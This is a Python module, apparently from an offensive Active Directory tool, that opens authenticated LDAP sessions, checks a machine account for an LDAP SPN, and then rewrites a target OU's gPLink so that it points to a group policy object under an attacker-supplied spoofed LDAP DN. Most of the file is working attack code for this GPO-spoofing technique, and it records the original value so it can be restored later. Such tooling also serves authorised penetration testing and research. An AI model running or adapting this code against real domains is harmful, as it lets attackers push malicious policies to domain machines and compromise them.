from ldap3 import Server, Connection, SASL, NTLM, KERBEROS, SUBTREE, MODIFY_REPLACE, MODIFY_DELETE, ALL_ATTRIBUTES, SCHEMA, ALL, TLS_CHANNEL_BINDING, ENCRYPT
from helpers.utils import logger, bcolors
from helpers.clean import clean_save_action


def get_ldap_session(domain, dc, ldaps, username, password, kerberos=False, all_info=False):
    if ldaps is True:
        server = Server(f'ldaps://{dc}:636', port = 636, use_ssl = True, get_info=SCHEMA if all_info is False else ALL)
    else:
        server = Server(f'ldap://{dc}:389', port = 389, use_ssl = False, get_info=SCHEMA if all_info is False else ALL)

    if kerberos is False:
        if ldaps is True:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True, raise_exceptions=True, channel_binding=TLS_CHANNEL_BINDING)
        else:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True, raise_exceptions=True, session_security=ENCRYPT)
    else:
        if ldaps is True:
            ldap_session = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True, raise_exceptions=True)
        else:
            ldap_session = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True, raise_exceptions=True, session_security=ENCRYPT)
    return ldap_session

def get_entries(ldap_session, search_base, search_filter, search_scope=SUBTREE, attributes=ALL_ATTRIBUTES, get_operational_attributes=False):
    entries = []
    ldap_session.search(
        search_base=search_base,
        search_filter=search_filter,
        search_scope=search_scope,
        attributes=attributes,
        get_operational_attributes=get_operational_attributes
    )

    for item in ldap_session.response:
        if item["type"] == "searchResEntry":
            entries.append(item)
    if len(entries) == 0:
        raise Exception(f"LDAP query for '{search_base}' with search filter {search_filter} did not return any results")
    
    return entries

def modify_attribute(ldap_session, dn, attribute, new_value):
    ldap_session.modify(dn, {attribute: [(MODIFY_REPLACE, [new_value])]})


def check_ldap_machine_object(ldap_session, cfg):
    try:
        entries = get_entries(
            ldap_session=ldap_session,
            search_base=cfg.domain_dn,
            search_filter=f"(sAMAccountName={cfg.ldap_machine})",
            attributes=["servicePrincipalName"]
        )
    except Exception as e:
        logger.error(f"Machine account '{cfg.ldap_machine}' does not exist in LDAP.")
        raise typer.Exit(1)

    machine_entry_attrs = entries[0].get("attributes", {})
    spns = machine_entry_attrs.get("servicePrincipalName", [])
    if not any(spn.lower().startswith("ldap/") for spn in spns):
        logger.error(f"Machine account '{cfg.ldap_machine}' does not have an LDAP SPN cfgured.")
        raise typer.Exit(1)
    logger.warning(f"{bcolors.OKGREEN}[+] Machine account '{cfg.ldap_machine}' verified (LDAP SPN present){bcolors.ENDC}")


def spoof_ou_gplink(ldap_session, cfg, clean_folder):
    ou_dn = cfg.ou_dn
    try:
        ou_entries = get_entries(
            ldap_session=ldap_session,
            search_base=ou_dn,
            search_filter="(objectClass=*)",
            search_scope=0,
            attributes=["gPLink"]
        )
    except Exception as e:
        logger.error(f"Target OU '{ou_dn}' does not exist.")
        raise typer.Exit(1)

    initial_gplink = ou_entries[0].get("attributes", {}).get("gPLink")
    if isinstance(initial_gplink, list):
        initial_gplink = initial_gplink[0] if initial_gplink else None
    logger.warning(f"[*] Initial gPLink is '{initial_gplink}'")
    
    added_gplink = f"[LDAP://cn={{{cfg.gpo_guid}}},cn=policies,cn=system,{cfg.spoofed_ldap_dn};0]"
    spoofed_gplink = added_gplink
    if initial_gplink:
        spoofed_gplink = str(initial_gplink) + spoofed_gplink
    logger.warning(f"[*] Spoofing gPLink to '{spoofed_gplink}'")

    try:
        modify_attribute(ldap_session, ou_dn, "gPLink", spoofed_gplink)
        logger.warning(f"{bcolors.OKGREEN}[+] Target OU '{ou_dn}' gPLink successfully modified{bcolors.ENDC}")
    except Exception as e:
        logger.error(f"Failed to modify gPLink for OU '{ou_dn}': {e}")
        raise typer.Exit(1)
    clean_save_action(clean_folder, "ldap_modify_attribute", cfg.ou_dn, "gPLink", old_value=initial_gplink, new_value=spoofed_gplink, added=added_gplink)